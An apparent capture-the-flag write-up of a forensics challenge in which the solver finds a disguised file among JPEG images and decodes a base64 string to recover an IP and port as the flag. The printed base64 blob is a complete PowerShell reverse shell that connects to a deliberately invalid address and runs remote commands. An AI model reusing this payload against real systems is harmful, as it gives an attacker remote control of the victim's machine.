[[Forensics]]
## Description

```
The-Veiled-Backtrace
Forensics 
Worth 930 Points 
Easy 
By Trent
```


A hard drive full of photos. Hundreds of still frames, nothing out of the ordinary. But something’s tucked away — veiled, deliberate. One image holds more than meets the eye. Peel back the layers. Follow the trace.

**Flag format: jctf{IP:Port}** **Note:** For this challenge the flag format is NOT jctfv{} but instead jctf{} **Note:** The IP is not a valid/real IP, this is for your protection.

And it had a download link to 'archive.zip' which contained 100 jpg files and 1 '...' file.

![[Pasted image 20250331123722.png]]


## Solution

Initially, because this was a forensics challenge, I thought I had to go through each image in order to find some sort of hidden data, so I spent ~30 minutes putting the jpgs through exiftool in order to find anything, but came up with nothing.
Then I realized (After way too long) that there was a non-jpg file in the zip: '...'

After opening '...' it gave:

`ÿØÿàZXJzaGVsbCAtbm9wIC1XIGhpZGRlbiAtbm9uaSAtZXAgYnlwYXNzIC1jICIkVENQQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuU29ja2V0cy5UQ1BDbGllbnQoJzY3OC40NjIuMTQ2LjMzNCcsIDg3ODkpOyROZXR3b3JrU3RyZWFtID0gJFRDUENsaWVudC5HZXRTdHJlYW0oKTskU3RyZWFtV3JpdGVyID0gTmV3LU9iamVjdCBJTy5TdHJlYW1Xcml0ZXIoJE5ldHdvcmtTdHJlYW0pO2Z1bmN0aW9uIFdyaXRlVG9TdHJlYW0gKCRTdHJpbmcpIHtbYnl0ZVtdXSRzY3JpcHQ6QnVmZmVyID0gMC4uJFRDUENsaWVudC5SZWNlaXZlQnVmZmVyU2l6ZSB8ICUgezB9OyRTdHJlYW1Xcml0ZXIuV3JpdGUoJFN0cmluZyArICdTSEVMTD4gJyk7JFN0cmVhbVdyaXRlci5GbHVzaCgpfVdyaXRlVG9TdHJlYW0gJyc7d2hpbGUoKCRCeXRlc1JlYWQgPSAkTmV0d29ya1N0cmVhbS5SZWFkKCRCdWZmZXIsIDAsICRCdWZmZXIuTGVuZ3RoKSkgLWd0IDApIHskQ29tbWFuZCA9IChbdGV4dC5lbmNvZGluZ106OlVURjgpLkdldFN0cmluZygkQnVmZmVyLCAwLCAkQnl0ZXNSZWFkIC0gMSk7JE91dHB1dCA9IHRyeSB7SW52b2tlLUV4cHJlc3Npb24gJENvbW1hbmQgMj4mMSB8IE91dC1TdHJpbmd9IGNhdGNoIHskXyB8IE91dC1TdHJpbmd9V3JpdGVUb1N0cmVhbSAoJE91dHB1dCl9JFN0cmVhbVdyaXRlci5DbG9zZSgpIg==
`

Which after seeing it ending with == I immediately recognized it as base64 code, and after decrypting it, it gave:
`Net.Sockets.TCPClient('678.462.146.334', 8789)`
(Note it gave a lot more text, but whenever I put that into this file, Windows considered it a trojan horse and completely wiped this folder)

And from that I noticed what the flag format was trying to get:
jctf{IP:Port} Note: The IP is not a valid/real IP, this is for your protection

## Flag

So after putting them together I got the flag
"jctf{678.462.146.334:8789}"